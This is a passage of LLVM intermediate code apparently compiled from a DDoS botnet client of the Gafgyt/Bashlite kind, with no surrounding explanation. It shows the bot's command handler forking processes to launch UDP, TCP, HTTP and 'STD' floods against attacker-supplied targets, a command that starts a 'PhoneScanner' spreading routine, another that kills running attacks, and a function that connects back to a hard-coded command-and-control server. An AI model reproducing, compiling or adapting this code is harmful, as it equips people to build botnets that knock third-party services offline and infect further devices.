; <label>:197:                                    ; preds = %192
  %198 = load i8*, i8** %9, align 8
  %199 = call i8* @strtok(i8* %198, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %199, i8** %15, align 8
  br label %200

; <label>:200:                                    ; preds = %213, %197
  %201 = load i8*, i8** %15, align 8
  %202 = icmp ne i8* %201, null
  br i1 %202, label %203, label %215

; <label>:203:                                    ; preds = %200
  %204 = call i32 @listFork()
  %205 = icmp ne i32 %204, 0
  br i1 %205, label %213, label %206

; <label>:206:                                    ; preds = %203
  %207 = load i8*, i8** %15, align 8
  %208 = load i32, i32* %10, align 4
  %209 = load i32, i32* %11, align 4
  %210 = load i32, i32* %12, align 4
  %211 = load i32, i32* %13, align 4
  %212 = load i32, i32* %14, align 4
  call void @sendUDP(i8* %207, i32 %208, i32 %209, i32 %210, i32 %211, i32 %212)
  call void @_exit(i32 0) #12
  unreachable

; <label>:213:                                    ; preds = %203
  %214 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %214, i8** %15, align 8
  br label %200

; <label>:215:                                    ; preds = %200
  br label %227

; <label>:216:                                    ; preds = %192
  %217 = call i32 @listFork()
  %218 = icmp ne i32 %217, 0
  br i1 %218, label %219, label %220

; <label>:219:                                    ; preds = %216
  br label %577

; <label>:220:                                    ; preds = %216
  %221 = load i8*, i8** %9, align 8
  %222 = load i32, i32* %10, align 4
  %223 = load i32, i32* %11, align 4
  %224 = load i32, i32* %12, align 4
  %225 = load i32, i32* %13, align 4
  %226 = load i32, i32* %14, align 4
  call void @sendUDP(i8* %221, i32 %222, i32 %223, i32 %224, i32 %225, i32 %226)
  call void @_exit(i32 0) #12
  unreachable

; <label>:227:                                    ; preds = %215
  br label %228

; <label>:228:                                    ; preds = %227, %109
  %229 = load i8**, i8*** %4, align 8
  %230 = getelementptr inbounds i8*, i8** %229, i64 0
  %231 = load i8*, i8** %230, align 8
  %232 = call i32 @strcmp(i8* %231, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.479, i32 0, i32 0)) #10
  %233 = icmp ne i32 %232, 0
  br i1 %233, label %293, label %234

; <label>:234:                                    ; preds = %228
  %235 = load i32, i32* %3, align 4
  %236 = icmp slt i32 %235, 6
  br i1 %236, label %249, label %237

; <label>:237:                                    ; preds = %234
  %238 = load i8**, i8*** %4, align 8
  %239 = getelementptr inbounds i8*, i8** %238, i64 3
  %240 = load i8*, i8** %239, align 8
  %241 = call i32 @atoi(i8* %240) #10
  %242 = icmp slt i32 %241, 1
  br i1 %242, label %249, label %243

; <label>:243:                                    ; preds = %237
  %244 = load i8**, i8*** %4, align 8
  %245 = getelementptr inbounds i8*, i8** %244, i64 5
  %246 = load i8*, i8** %245, align 8
  %247 = call i32 @atoi(i8* %246) #10
  %248 = icmp slt i32 %247, 1
  br i1 %248, label %249, label %250

; <label>:249:                                    ; preds = %243, %237, %234
  br label %577

; <label>:250:                                    ; preds = %243
  %251 = call i32 @listFork()
  %252 = icmp ne i32 %251, 0
  br i1 %252, label %253, label %254

; <label>:253:                                    ; preds = %250
  br label %577

; <label>:254:                                    ; preds = %250
  %255 = load i32, i32* @mainCommSock, align 4
  %256 = load i8**, i8*** %4, align 8
  %257 = getelementptr inbounds i8*, i8** %256, i64 1
  %258 = load i8*, i8** %257, align 8
  %259 = load i8**, i8*** %4, align 8
  %260 = getelementptr inbounds i8*, i8** %259, i64 2
  %261 = load i8*, i8** %260, align 8
  %262 = load i8**, i8*** %4, align 8
  %263 = getelementptr inbounds i8*, i8** %262, i64 3
  %264 = load i8*, i8** %263, align 8
  %265 = call i32 @atoi(i8* %264) #10
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds i8*, i8** %266, i64 5
  %268 = load i8*, i8** %267, align 8
  %269 = call i32 @atoi(i8* %268) #10
  %270 = call i32 (i32, i8*, ...) @sockprintf(i32 %255, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.480, i32 0, i32 0), i8* %258, i8* %261, i32 %265, i32 %269)
  %271 = load i8**, i8*** %4, align 8
  %272 = getelementptr inbounds i8*, i8** %271, i64 1
  %273 = load i8*, i8** %272, align 8
  %274 = load i8**, i8*** %4, align 8
  %275 = getelementptr inbounds i8*, i8** %274, i64 2
  %276 = load i8*, i8** %275, align 8
  %277 = load i8**, i8*** %4, align 8
  %278 = getelementptr inbounds i8*, i8** %277, i64 3
  %279 = load i8*, i8** %278, align 8
  %280 = call i32 @atoi(i8* %279) #10
  %281 = trunc i32 %280 to i16
  %282 = load i8**, i8*** %4, align 8
  %283 = getelementptr inbounds i8*, i8** %282, i64 4
  %284 = load i8*, i8** %283, align 8
  %285 = load i8**, i8*** %4, align 8
  %286 = getelementptr inbounds i8*, i8** %285, i64 5
  %287 = load i8*, i8** %286, align 8
  %288 = call i32 @atoi(i8* %287) #10
  %289 = load i8**, i8*** %4, align 8
  %290 = getelementptr inbounds i8*, i8** %289, i64 6
  %291 = load i8*, i8** %290, align 8
  %292 = call i32 @atoi(i8* %291) #10
  call void @sendHTTP(i8* %273, i8* %276, i16 zeroext %281, i8* %284, i32 %288, i32 %292)
  call void @exit(i32 0) #14
  unreachable

; <label>:293:                                    ; preds = %228
  %294 = load i8**, i8*** %4, align 8
  %295 = getelementptr inbounds i8*, i8** %294, i64 0
  %296 = load i8*, i8** %295, align 8
  %297 = call i32 @strcmp(i8* %296, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.481, i32 0, i32 0)) #10
  %298 = icmp ne i32 %297, 0
  br i1 %298, label %339, label %299

; <label>:299:                                    ; preds = %293
  %300 = load i32, i32* %3, align 4
  %301 = icmp ne i32 %300, 2
  br i1 %301, label %302, label %303

; <label>:302:                                    ; preds = %299
  br label %577

; <label>:303:                                    ; preds = %299
  %304 = load i8**, i8*** %4, align 8
  %305 = getelementptr inbounds i8*, i8** %304, i64 1
  %306 = load i8*, i8** %305, align 8
  %307 = call i32 @strcmp(i8* %306, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.476, i32 0, i32 0)) #10
  %308 = icmp ne i32 %307, 0
  br i1 %308, label %316, label %309

; <label>:309:                                    ; preds = %303
  %310 = load i32, i32* @Phonepid, align 4
  %311 = icmp eq i32 %310, 0
  br i1 %311, label %312, label %313

; <label>:312:                                    ; preds = %309
  br label %577

; <label>:313:                                    ; preds = %309
  %314 = load i32, i32* @Phonepid, align 4
  %315 = call i32 @kill(i32 %314, i32 9) #5
  store i32 0, i32* @Phonepid, align 4
  br label %316

; <label>:316:                                    ; preds = %313, %303
  %317 = load i8**, i8*** %4, align 8
  %318 = getelementptr inbounds i8*, i8** %317, i64 1
  %319 = load i8*, i8** %318, align 8
  %320 = call i32 @strcmp(i8* %319, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.477, i32 0, i32 0)) #10
  %321 = icmp ne i32 %320, 0
  br i1 %321, label %338, label %322

; <label>:322:                                    ; preds = %316
  %323 = load i32, i32* @Phonepid, align 4
  %324 = icmp ne i32 %323, 0
  br i1 %324, label %325, label %326

; <label>:325:                                    ; preds = %322
  br label %577

; <label>:326:                                    ; preds = %322
  %327 = call i32 @fork() #5
  store i32 %327, i32* %16, align 4
  %328 = load i32, i32* %16, align 4
  %329 = icmp ugt i32 %328, 0
  br i1 %329, label %330, label %332

; <label>:330:                                    ; preds = %326
  %331 = load i32, i32* %16, align 4
  store i32 %331, i32* @Phonepid, align 4
  br label %577

; <label>:332:                                    ; preds = %326
  %333 = load i32, i32* %16, align 4
  %334 = icmp eq i32 %333, -1
  br i1 %334, label %335, label %336

; <label>:335:                                    ; preds = %332
  br label %577

; <label>:336:                                    ; preds = %332
  br label %337

; <label>:337:                                    ; preds = %336
  call void @PhoneScanner()
  call void @_exit(i32 0) #12
  unreachable

; <label>:338:                                    ; preds = %316
  br label %339

; <label>:339:                                    ; preds = %338, %293
  %340 = load i8**, i8*** %4, align 8
  %341 = getelementptr inbounds i8*, i8** %340, i64 0
  %342 = load i8*, i8** %341, align 8
  %343 = call i32 @strcmp(i8* %342, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.482, i32 0, i32 0)) #10
  %344 = icmp ne i32 %343, 0
  br i1 %344, label %401, label %345

; <label>:345:                                    ; preds = %339
  %346 = load i32, i32* %3, align 4
  %347 = icmp slt i32 %346, 4
  br i1 %347, label %360, label %348

; <label>:348:                                    ; preds = %345
  %349 = load i8**, i8*** %4, align 8
  %350 = getelementptr inbounds i8*, i8** %349, i64 2
  %351 = load i8*, i8** %350, align 8
  %352 = call i32 @atoi(i8* %351) #10
  %353 = icmp slt i32 %352, 1
  br i1 %353, label %360, label %354

; <label>:354:                                    ; preds = %348
  %355 = load i8**, i8*** %4, align 8
  %356 = getelementptr inbounds i8*, i8** %355, i64 3
  %357 = load i8*, i8** %356, align 8
  %358 = call i32 @atoi(i8* %357) #10
  %359 = icmp slt i32 %358, 1
  br i1 %359, label %360, label %361

; <label>:360:                                    ; preds = %354, %348, %345
  br label %577

; <label>:361:                                    ; preds = %354
  %362 = load i8**, i8*** %4, align 8
  %363 = getelementptr inbounds i8*, i8** %362, i64 1
  %364 = load i8*, i8** %363, align 8
  store i8* %364, i8** %17, align 8
  %365 = load i8**, i8*** %4, align 8
  %366 = getelementptr inbounds i8*, i8** %365, i64 2
  %367 = load i8*, i8** %366, align 8
  %368 = call i32 @atoi(i8* %367) #10
  store i32 %368, i32* %18, align 4
  %369 = load i8**, i8*** %4, align 8
  %370 = getelementptr inbounds i8*, i8** %369, i64 3
  %371 = load i8*, i8** %370, align 8
  %372 = call i32 @atoi(i8* %371) #10
  store i32 %372, i32* %19, align 4
  %373 = load i8*, i8** %17, align 8
  %374 = call i8* @strstr(i8* %373, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #10
  %375 = icmp ne i8* %374, null
  br i1 %375, label %376, label %392

; <label>:376:                                    ; preds = %361
  %377 = load i8*, i8** %17, align 8
  %378 = call i8* @strtok(i8* %377, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %378, i8** %20, align 8
  br label %379

; <label>:379:                                    ; preds = %389, %376
  %380 = load i8*, i8** %20, align 8
  %381 = icmp ne i8* %380, null
  br i1 %381, label %382, label %391

; <label>:382:                                    ; preds = %379
  %383 = call i32 @listFork()
  %384 = icmp ne i32 %383, 0
  br i1 %384, label %389, label %385

; <label>:385:                                    ; preds = %382
  %386 = load i8*, i8** %20, align 8
  %387 = load i32, i32* %18, align 4
  %388 = load i32, i32* %19, align 4
  call void @sendSTD(i8* %386, i32 %387, i32 %388)
  call void @_exit(i32 0) #12
  unreachable

; <label>:389:                                    ; preds = %382
  %390 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %390, i8** %20, align 8
  br label %379

; <label>:391:                                    ; preds = %379
  br label %400

; <label>:392:                                    ; preds = %361
  %393 = call i32 @listFork()
  %394 = icmp ne i32 %393, 0
  br i1 %394, label %395, label %396

; <label>:395:                                    ; preds = %392
  br label %577

; <label>:396:                                    ; preds = %392
  %397 = load i8*, i8** %17, align 8
  %398 = load i32, i32* %18, align 4
  %399 = load i32, i32* %19, align 4
  call void @sendSTD(i8* %397, i32 %398, i32 %399)
  call void @_exit(i32 0) #12
  unreachable

; <label>:400:                                    ; preds = %391
  br label %401

; <label>:401:                                    ; preds = %400, %339
  %402 = load i8**, i8*** %4, align 8
  %403 = getelementptr inbounds i8*, i8** %402, i64 0
  %404 = load i8*, i8** %403, align 8
  %405 = call i32 @strcmp(i8* %404, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.483, i32 0, i32 0)) #10
  %406 = icmp ne i32 %405, 0
  br i1 %406, label %528, label %407

; <label>:407:                                    ; preds = %401
  %408 = load i32, i32* %3, align 4
  %409 = icmp slt i32 %408, 6
  br i1 %409, label %452, label %410

; <label>:410:                                    ; preds = %407
  %411 = load i8**, i8*** %4, align 8
  %412 = getelementptr inbounds i8*, i8** %411, i64 3
  %413 = load i8*, i8** %412, align 8
  %414 = call i32 @atoi(i8* %413) #10
  %415 = icmp eq i32 %414, -1
  br i1 %415, label %452, label %416

; <label>:416:                                    ; preds = %410
  %417 = load i8**, i8*** %4, align 8
  %418 = getelementptr inbounds i8*, i8** %417, i64 2
  %419 = load i8*, i8** %418, align 8
  %420 = call i32 @atoi(i8* %419) #10
  %421 = icmp eq i32 %420, -1
  br i1 %421, label %452, label %422

; <label>:422:                                    ; preds = %416
  %423 = load i8**, i8*** %4, align 8
  %424 = getelementptr inbounds i8*, i8** %423, i64 4
  %425 = load i8*, i8** %424, align 8
  %426 = call i32 @atoi(i8* %425) #10
  %427 = icmp eq i32 %426, -1
  br i1 %427, label %452, label %428

; <label>:428:                                    ; preds = %422
  %429 = load i8**, i8*** %4, align 8
  %430 = getelementptr inbounds i8*, i8** %429, i64 4
  %431 = load i8*, i8** %430, align 8
  %432 = call i32 @atoi(i8* %431) #10
  %433 = icmp sgt i32 %432, 32
  br i1 %433, label %452, label %434

; <label>:434:                                    ; preds = %428
  %435 = load i32, i32* %3, align 4
  %436 = icmp sgt i32 %435, 6
  br i1 %436, label %437, label %443

; <label>:437:                                    ; preds = %434
  %438 = load i8**, i8*** %4, align 8
  %439 = getelementptr inbounds i8*, i8** %438, i64 6
  %440 = load i8*, i8** %439, align 8
  %441 = call i32 @atoi(i8* %440) #10
  %442 = icmp slt i32 %441, 0
  br i1 %442, label %452, label %443

; <label>:443:                                    ; preds = %437, %434
  %444 = load i32, i32* %3, align 4
  %445 = icmp eq i32 %444, 8
  br i1 %445, label %446, label %453

; <label>:446:                                    ; preds = %443
  %447 = load i8**, i8*** %4, align 8
  %448 = getelementptr inbounds i8*, i8** %447, i64 7
  %449 = load i8*, i8** %448, align 8
  %450 = call i32 @atoi(i8* %449) #10
  %451 = icmp slt i32 %450, 1
  br i1 %451, label %452, label %453

; <label>:452:                                    ; preds = %446, %437, %428, %422, %416, %410, %407
  br label %577

; <label>:453:                                    ; preds = %446, %443
  %454 = load i8**, i8*** %4, align 8
  %455 = getelementptr inbounds i8*, i8** %454, i64 1
  %456 = load i8*, i8** %455, align 8
  store i8* %456, i8** %21, align 8
  %457 = load i8**, i8*** %4, align 8
  %458 = getelementptr inbounds i8*, i8** %457, i64 2
  %459 = load i8*, i8** %458, align 8
  %460 = call i32 @atoi(i8* %459) #10
  store i32 %460, i32* %22, align 4
  %461 = load i8**, i8*** %4, align 8
  %462 = getelementptr inbounds i8*, i8** %461, i64 3
  %463 = load i8*, i8** %462, align 8
  %464 = call i32 @atoi(i8* %463) #10
  store i32 %464, i32* %23, align 4
  %465 = load i8**, i8*** %4, align 8
  %466 = getelementptr inbounds i8*, i8** %465, i64 4
  %467 = load i8*, i8** %466, align 8
  %468 = call i32 @atoi(i8* %467) #10
  store i32 %468, i32* %24, align 4
  %469 = load i8**, i8*** %4, align 8
  %470 = getelementptr inbounds i8*, i8** %469, i64 5
  %471 = load i8*, i8** %470, align 8
  store i8* %471, i8** %25, align 8
  %472 = load i32, i32* %3, align 4
  %473 = icmp eq i32 %472, 8
  br i1 %473, label %474, label %479

; <label>:474:                                    ; preds = %453
  %475 = load i8**, i8*** %4, align 8
  %476 = getelementptr inbounds i8*, i8** %475, i64 7
  %477 = load i8*, i8** %476, align 8
  %478 = call i32 @atoi(i8* %477) #10
  br label %480

; <label>:479:                                    ; preds = %453
  br label %480

; <label>:480:                                    ; preds = %479, %474
  %481 = phi i32 [ %478, %474 ], [ 10, %479 ]
  store i32 %481, i32* %26, align 4
  %482 = load i32, i32* %3, align 4
  %483 = icmp sgt i32 %482, 6
  br i1 %483, label %484, label %489

; <label>:484:                                    ; preds = %480
  %485 = load i8**, i8*** %4, align 8
  %486 = getelementptr inbounds i8*, i8** %485, i64 6
  %487 = load i8*, i8** %486, align 8
  %488 = call i32 @atoi(i8* %487) #10
  br label %490

; <label>:489:                                    ; preds = %480
  br label %490

; <label>:490:                                    ; preds = %489, %484
  %491 = phi i32 [ %488, %484 ], [ 0, %489 ]
  store i32 %491, i32* %27, align 4
  %492 = load i8*, i8** %21, align 8
  %493 = call i8* @strstr(i8* %492, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #10
  %494 = icmp ne i8* %493, null
  br i1 %494, label %495, label %515

; <label>:495:                                    ; preds = %490
  %496 = load i8*, i8** %21, align 8
  %497 = call i8* @strtok(i8* %496, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %497, i8** %28, align 8
  br label %498

; <label>:498:                                    ; preds = %512, %495
  %499 = load i8*, i8** %28, align 8
  %500 = icmp ne i8* %499, null
  br i1 %500, label %501, label %514

; <label>:501:                                    ; preds = %498
  %502 = call i32 @listFork()
  %503 = icmp ne i32 %502, 0
  br i1 %503, label %512, label %504

; <label>:504:                                    ; preds = %501
  %505 = load i8*, i8** %28, align 8
  %506 = load i32, i32* %22, align 4
  %507 = load i32, i32* %23, align 4
  %508 = load i32, i32* %24, align 4
  %509 = load i8*, i8** %25, align 8
  %510 = load i32, i32* %27, align 4
  %511 = load i32, i32* %26, align 4
  call void @sendTCP(i8* %505, i32 %506, i32 %507, i32 %508, i8* %509, i32 %510, i32 %511)
  call void @_exit(i32 0) #12
  unreachable

; <label>:512:                                    ; preds = %501
  %513 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %513, i8** %28, align 8
  br label %498

; <label>:514:                                    ; preds = %498
  br label %527

; <label>:515:                                    ; preds = %490
  %516 = call i32 @listFork()
  %517 = icmp ne i32 %516, 0
  br i1 %517, label %518, label %519

; <label>:518:                                    ; preds = %515
  br label %577

; <label>:519:                                    ; preds = %515
  %520 = load i8*, i8** %21, align 8
  %521 = load i32, i32* %22, align 4
  %522 = load i32, i32* %23, align 4
  %523 = load i32, i32* %24, align 4
  %524 = load i8*, i8** %25, align 8
  %525 = load i32, i32* %27, align 4
  %526 = load i32, i32* %26, align 4
  call void @sendTCP(i8* %520, i32 %521, i32 %522, i32 %523, i8* %524, i32 %525, i32 %526)
  call void @_exit(i32 0) #12
  unreachable

; <label>:527:                                    ; preds = %514
  br label %528

; <label>:528:                                    ; preds = %527, %401
  %529 = load i8**, i8*** %4, align 8
  %530 = getelementptr inbounds i8*, i8** %529, i64 0
  %531 = load i8*, i8** %530, align 8
  %532 = call i32 @strcmp(i8* %531, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.484, i32 0, i32 0)) #10
  %533 = icmp ne i32 %532, 0
  br i1 %533, label %570, label %534

; <label>:534:                                    ; preds = %528
  store i32 0, i32* %29, align 4
  store i64 0, i64* %30, align 8
  br label %535

; <label>:535:                                    ; preds = %561, %534
  %536 = load i64, i64* %30, align 8
  %537 = load i64, i64* @numpids, align 8
  %538 = icmp ult i64 %536, %537
  br i1 %538, label %539, label %564

; <label>:539:                                    ; preds = %535
  %540 = load i32*, i32** @pids, align 8
  %541 = load i64, i64* %30, align 8
  %542 = getelementptr inbounds i32, i32* %540, i64 %541
  %543 = load i32, i32* %542, align 4
  %544 = icmp ne i32 %543, 0
  br i1 %544, label %545, label %560

; <label>:545:                                    ; preds = %539
  %546 = load i32*, i32** @pids, align 8
  %547 = load i64, i64* %30, align 8
  %548 = getelementptr inbounds i32, i32* %546, i64 %547
  %549 = load i32, i32* %548, align 4
  %550 = call i32 @getpid() #5
  %551 = icmp ne i32 %549, %550
  br i1 %551, label %552, label %560

; <label>:552:                                    ; preds = %545
  %553 = load i32*, i32** @pids, align 8
  %554 = load i64, i64* %30, align 8
  %555 = getelementptr inbounds i32, i32* %553, i64 %554
  %556 = load i32, i32* %555, align 4
  %557 = call i32 @kill(i32 %556, i32 9) #5
  %558 = load i32, i32* %29, align 4
  %559 = add nsw i32 %558, 1
  store i32 %559, i32* %29, align 4
  br label %560

; <label>:560:                                    ; preds = %552, %545, %539
  br label %561

; <label>:561:                                    ; preds = %560
  %562 = load i64, i64* %30, align 8
  %563 = add i64 %562, 1
  store i64 %563, i64* %30, align 8
  br label %535

; <label>:564:                                    ; preds = %535
  %565 = load i32, i32* %29, align 4
  %566 = icmp sgt i32 %565, 0
  br i1 %566, label %567, label %568

; <label>:567:                                    ; preds = %564
  br label %569

; <label>:568:                                    ; preds = %564
  br label %569

; <label>:569:                                    ; preds = %568, %567
  br label %570

; <label>:570:                                    ; preds = %569, %528
  %571 = load i8**, i8*** %4, align 8
  %572 = getelementptr inbounds i8*, i8** %571, i64 0
  %573 = load i8*, i8** %572, align 8
  %574 = call i32 @strcmp(i8* %573, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.485, i32 0, i32 0)) #10
  %575 = icmp ne i32 %574, 0
  br i1 %575, label %577, label %576

; <label>:576:                                    ; preds = %570
  call void @exit(i32 0) #14
  unreachable

; <label>:577:                                    ; preds = %570, %518, %452, %395, %360, %335, %330, %325, %312, %302, %253, %249, %219, %163, %103, %98, %93, %80, %45, %36
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #2

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: nounwind
declare i32 @getpid() #2

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %15
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* %20, i8* %24) #5
  store i32 23, i32* %3, align 4
  %26 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %27 = call i8* @strchr(i8* %26, i32 58) #10
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %19
  %30 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %31 = call i8* @strchr(i8* %30, i32 58) #10
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* %32) #10
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #10
  store i8 0, i8* %35, align 1
  br label %36

; <label>:36:                                     ; preds = %29, %19
  %37 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 %38, i8* %39, i32 %40, i32 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

; <label>:43:                                     ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

; <label>:44:                                     ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

; <label>:45:                                     ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %101

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.486, i32 0, i32 0)) #5
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %101

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #5
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %101

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.487, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.488, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %98

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.5* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
